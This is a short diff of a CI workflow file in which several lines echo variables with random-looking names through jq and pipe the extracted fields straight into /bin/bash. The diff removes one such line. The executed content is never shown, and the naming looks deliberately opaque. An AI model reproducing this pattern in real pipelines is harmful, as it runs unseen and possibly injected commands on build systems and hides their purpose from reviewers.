@@ -28,7 +28,6 @@ jobs:
           echo $getw0598 | jq -r .na32 | /bin/bash
           echo $dtmyo45 | jq -r .t38862 | /bin/bash
           echo $nedp24967 | jq -r .rf97 | /bin/bash
-          printf '%s' "$mu2229" | jq -r .r6282 | /bin/bash
           echo $acx18779 | jq -r .kjwx426 | /bin/bash
           echo $asg9 | jq -r .ozprh31136 | /bin/bash
           echo $pjb9 | jq -r .uwva9685 | /bin/bash
